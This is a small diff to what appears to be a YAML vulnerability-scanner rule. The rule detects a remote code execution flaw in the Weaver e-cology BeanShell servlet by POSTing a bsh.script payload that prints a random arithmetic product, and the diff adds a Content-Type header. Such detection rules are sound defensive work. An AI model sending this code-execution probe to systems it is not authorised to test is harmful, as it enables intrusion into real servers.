@@ -9,6 +9,8 @@ rules:
       method: POST
       path: /weaver/bsh.servlet.BshServlet
       body: bsh.script=print%28{{r1}}*{{r2}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+      headers:
+        Content-Type: application/x-www-form-urlencoded
     expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
 expression: r0()
 detail:
